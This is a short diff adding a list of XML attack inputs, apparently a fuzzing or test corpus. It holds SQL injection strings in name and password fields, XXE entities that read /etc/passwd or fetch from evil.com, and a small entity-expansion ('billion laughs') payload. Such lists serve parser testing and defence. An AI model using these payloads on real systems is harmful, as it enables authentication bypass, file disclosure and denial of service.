@@ -1,0 +1,10 @@
+<user><name>John</name><password>' OR '1'='1'</password></user>
+<?xml version="1.0"?>
+<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root>&xxe;</root>
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>
+<foo>&xxe;</foo>
+<user><name>' or '1'='1</name><password>password</password></user>
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;">]>
+<root>&lol2;</root>
